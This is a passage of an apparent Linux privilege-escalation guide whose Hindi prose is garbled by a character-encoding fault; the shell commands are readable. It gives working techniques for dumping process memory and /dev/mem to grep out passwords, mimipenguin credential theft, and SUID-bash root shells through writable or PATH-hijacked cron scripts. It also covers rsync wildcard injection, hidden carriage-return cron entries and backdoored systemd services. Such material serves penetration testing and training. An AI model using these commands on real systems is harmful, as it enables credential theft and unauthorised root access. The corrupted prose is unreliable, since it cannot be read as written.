рдПрдХ рджрд┐рдП рдЧрдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреЗ рд▓рд┐рдП, **maps рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рднреАрддрд░ рдХреИрд╕реЗ рдореЗрдореЛрд░реА рдореИрдк рд╣реЛрддреА рд╣реИ рджрд┐рдЦрд╛рддрд╛ рд╣реИ**; рдпрд╣ рднреА рджрд┐рдЦрд╛рддрд╛ рд╣реИ **рдкреНрд░рддреНрдпреЗрдХ рдореИрдк рдХреНрд╖реЗрддреНрд░ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ**. **mem** рдкреНрд╕реЗрдбреЛ рдлрд╝рд╛рдЗрд▓ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреА рд╣реИ**. maps рдлрд╝рд╛рдЗрд▓ рд╕реЗ рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕реЗ рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдкрдардиреАрдп рд╣реИрдВ** рдФрд░ рдЙрдирдХреЗ рдСрдлрд╝рд╕реЗрдЯреНрд╕. рд╣рдо рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **mem рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЬрд╛рдХрд░ рд╕рднреА рдкрдардиреАрдп рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреЛ рдбрдВрдк рдХрд░рддреЗ рд╣реИрдВ** рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` рд╕рд┐рд╕реНрдЯрдо рдХреА **рднреМрддрд┐рдХ** рдореЗрдореЛрд░реА рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рди рдХрд┐ рд╡рд░реНрдЪреБрдЕрд▓ рдореЗрдореЛрд░реАред рдХрд░реНрдирд▓ рдХреЗ рд╡рд░реНрдЪреБрдЕрд▓ рдПрдбреНрд░реЗрд╕ рд╕реНрдкреЗрд╕ рдХреЛ /dev/kmem рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЖрдорддреМрд░ рдкрд░, `/dev/mem` рдХреЗрд╡рд▓ **рд░реВрдЯ** рдФрд░ **kmem** рд╕рдореВрд╣ рджреНрд╡рд╛рд░рд╛ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рд╣реЛрддрд╛ рд╣реИред
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump рд▓рд┐рдирдХреНрд╕ рдХреЗ рд▓рд┐рдП

ProcDump рдПрдХ рд▓рд┐рдирдХреНрд╕ рдХрд╛ рдирд╡реАрдиреАрдХрд░рдг рд╣реИ, рдЬреЛ рд╡рд┐рдВрдбреЛрдЬ рдХреЗ Sysinternals рд╕реБрдЗрдЯ рдХреЗ рд╢реНрд░реЗрдгреА рдореЗрдВ рд╕реЗ рдХреНрд▓рд╛рд╕рд┐рдХ ProcDump рдЯреВрд▓ рд╣реИред рдЗрд╕реЗ [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### рдЙрдкрдХрд░рдг

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрди рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (рд░реВрдЯ) - \_рдЖрдк рд░реВрдЯ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд░рдЦреА рдЧрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ A.5 (рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ)

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдореЛрд░реА рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рдирдХрд╛рд░реА

#### рдореИрдиреНрдпреБрдЕрд▓ рдЙрджрд╛рд╣рд░рдг

рдпрджрд┐ рдЖрдкрдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪрд▓ рд░рд╣реА рд╣реИ рддреЛ:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рдХреЛ рдвреВрдВрдврдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рдЦрдВрдб рджреЗрдЦреЗрдВ) рдФрд░ рдореЗрдореЛрд░реА рдХреЗ рдЕрдВрджрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### рдорд┐рдореАрдкреЗрдВрдЧреНрд╡рд┐рди

рдпрд╣ рдЯреВрд▓ [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) рдореЗрдореЛрд░реА рд╕реЗ **рд╕рд╛рдл рдкрд╛рда рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдФрд░ рдХреБрдЫ **рдкреНрд░рд╕рд┐рджреНрдз рдлрд╝рд╛рдЗрд▓реЛрдВ** рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреЛрд░реА рдХрд░реЗрдЧрд╛ред рдЗрд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

| рд╕реБрд╡рд┐рдзрд╛                                           | рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдирд╛рдо         |
| ------------------------------------------------- | -------------------- |
| GDM рдкрд╛рд╕рд╡рд░реНрдб (Kali рдбреЗрд╕реНрдХрдЯреЙрдк, Debian рдбреЗрд╕реНрдХрдЯреЙрдк)       | gdm-password         |
| Gnome Keyring (Ubuntu рдбреЗрд╕реНрдХрдЯреЙрдк, ArchLinux рдбреЗрд╕реНрдХрдЯреЙрдк) | gnome-keyring-daemon |
| LightDM (Ubuntu рдбреЗрд╕реНрдХрдЯреЙрдк)                          | lightdm              |
| VSFTPd (рд╕рдХреНрд░рд┐рдп FTP рдХрдиреЗрдХреНрд╢рди)                   | vsftpd               |
| Apache2 (рд╕рдХреНрд░рд┐рдп HTTP рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░)         | apache2              |
| OpenSSH (рд╕рдХреНрд░рд┐рдп SSH рд╕рддреНрд░ - Sudo рдЙрдкрдпреЛрдЧ)        | sshd:                |

#### рдЦреЛрдЬ рд░реЗрдЬреЗрдХреНрд╕/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## рдирд┐рд░реНрдзрд╛рд░рд┐рдд / рдХреНрд░реЙрди рдЬреЙрдмреНрд╕

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЬреЙрдм рднреЗрджреНрдп рд╣реИред рд╢рд╛рдпрдж рдЖрдк рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рднреЗрджреНрдпрддрд╛? рдХреНрдпрд╛ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ? рд╕рд┐рдорд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ? рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдПрдБ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### рдХреНрд░реЙрди рдкрде

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, _/etc/crontab_ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдкрд╛рда рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ "user" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ /home/user рдкрд░ рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░ рд╣реИ_)

рдпрджрд┐ рдЗрд╕ crontab рдореЗрдВ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдИ рдХрдорд╛рдВрдб рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкрд╛рде рд╕реЗрдЯ рдХрд┐рдП рдмрд┐рдирд╛ рдЪрд▓рд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: _\* \* \* \* root overwrite.sh_\
рддреЛ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░реВрдЯ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### рдХреНрд░реЙрди рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗ рд╕рд╛рде рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдЗрдВрдЬреЗрдХреНрд╢рди)

рдпрджрд┐ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХрдорд╛рдВрдб рдореЗрдВ "рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб" ("**\***") рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ рдХрд┐ рдкреНрд░рд╛рдЗрд╡реЗрд╕реАрдХ). рдЙрджрд╛рд╣рд░рдг:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**рдпрджрд┐ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗ рдкрд╢реНрдЪрд╛рддреН рдПрдХ рдкрде рдЬреИрд╕реЗ** _**/some/path/\***_ **рд╣реЛ, рддреЛ рдпрд╣ рдЕрднрд┐рд╢рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛ (рд╣рд╛рд▓рд╛рдВрдХрд┐** _**./\***_ **рднреА рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред)**

рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдФрд░ рдЕрдзрд┐рдХ рддрд░реАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### рдХреНрд░реЙрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдзрд┐рд▓реЗрдЦрди рдФрд░ рд╕рд┐рдВрдмрд▓рд┐рдВрдХ

рдпрджрд┐ рдЖрдк **рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреНрд░реЙрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
рдпрджрд┐ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ **рдРрд╕реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреВрд░реА рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ**, рддреЛ рд╢рд╛рдпрдж рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ рдФрд░ рдПрдХ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд┐рдВрдмрд▓рд┐рдВрдХ рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рдПрдВ, рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рд╕реЗрд╡рд╛ рд╣реЛред
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### рдЖрд╡реГрддреНрддрд┐ рд╡рд╛рд▓реЗ рдХреНрд░реЙрди рдЬреЙрдмреНрд╕

рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк 1, 2 рдпрд╛ 5 рдорд┐рдирдЯ рдХреЗ рдЕрдВрддрд░рд╛рд▓ рдореЗрдВ рдЪрд▓ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдЦреЛрдЬ рд╕рдХреЗрдВред рд╢рд╛рдпрдж рдЖрдк рдЗрд╕рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **1 рдорд┐рдирдЯ рдХреЗ рджреМрд░рд╛рди рд╣рд░ 0.1 рд╕реЗрдХрдВрдб рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ**, **рдХрдо рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдбреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХреНрд░рдордмрджреНрдз рдХрд░реЗрдВ** рдФрд░ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**рдЖрдк рднреА** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдпрд╣ рд╣рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдФрд░ рд╕реВрдЪреАрдХрд░рдг рдХрд░реЗрдЧрд╛ред)

### рдЕрджреГрд╢реНрдп cron рдиреМрдХрд░рд┐рдпрд╛рдВ

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рдХреНрд░реЙрди рдиреМрдХрд░реА **рдЯрд┐рдкреНрдкрдгреА рдХреЗ рдмрд╛рдж рдПрдХ рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдбрд╛рд▓рдХрд░** (рдиреНрдпреВрд▓рд╛рдЗрди рд╡рд░реНрдг рдХреЗ рдмрд┐рдирд╛), рдФрд░ рдХреНрд░реЙрди рдиреМрдХрд░реА рдХрд╛рдо рдХрд░реЗрдЧреАред рдЙрджрд╛рд╣рд░рдг (рдХреГрдкрдпрд╛ рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рд╡рд░реНрдг рдХрд╛ рдзреНрдпрд╛рди рджреЗрдВ):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## рд╕реЗрд╡рд╛рдПрдВ

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп _.service_ рдлрд╝рд╛рдЗрд▓реЗрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рднреА `.service` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рд╣рд╛рдВ, рддреЛ рдЖрдк рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рдЬрдм рд╕реЗрд╡рд╛ **рд╢реБрд░реВ**, **рдкреБрдирд░рд╛рд░рдВрдн** рдпрд╛ **рдмрдВрдж** рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдкрдХрд╛ **рдмреИрдХрдбреЛрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ** (рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдорд╢реАрди рдХреЗ рдкреБрдирд░рд╛рд░рдВрдн рд╣реЛрдиреЗ рддрдХ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреА рдкрдбрд╝реЗрдЧреА)ред
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ рдмреИрдХрдбреЛрд░ рдХреЛ .service рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рдПрдВ рдФрд░ **`ExecStart=/tmp/script.sh`** рдХреЗ рд╕рд╛рдеред

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЗрд╡рд╛ рдмрд╛рдЗрдирд░реА

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕реЗрд╡рд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдмрд╛рдЗрдирд░реА рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдмреИрдХрдбреЛрд░ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рд╕реЗрд╡рд╛рдПрдВ рдкреБрдирдГ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░ рдмреИрдХрдбреЛрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВред

### systemd PATH - рд╕рд╛рдкреЗрдХреНрд╖ рдорд╛рд░реНрдЧ

рдЖрдк **systemd** рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ PATH рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
systemctl show-environment
```
рдпрджрд┐ рдЖрдкрдХреЛ рдкрд╛рда рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ **рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЖрдкрдХреЛ рдЦреЛрдЬ рдХрд░рдиреА рд╣реЛрдЧреА **рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ **рд╕рдВрдмрдВрдзрд┐рдд рдкрдереЛрдВ** рдХреЗ рд▓рд┐рдПред
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
рддреЛ, рдЙрд╕реА рдирд╛рдо рдХреЗ **executable** рдХреЛ рдмрдирд╛рдПрдВ рдЬреЛ рд╕рд┐рд╕реНрдЯрдордбреА рдХреЗ рдкрд╛рде рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЖрдк рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЬрдм рд╕реЗрд╡рд╛ рдХреЛ рд╡рд┐рдХрд▓реНрдкреА рдХрд╛рд░реНрд░рд╡рд╛рдИ (**рд╢реБрд░реВ**, **рд░реЛрдХреЗрдВ**, **рд░реАрд▓реЛрдб**) рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХрд╛ **рдмреИрдХрдбреЛрд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛** (рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдорддреМрд░ рдкрд░ рд╕реЗрд╡рд╛рдПрдВ рд╢реБрд░реВ / рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк `sudo -l` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред)

**`man systemd.service` рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред**

## **рдЯрд╛рдЗрдорд░реНрд╕**

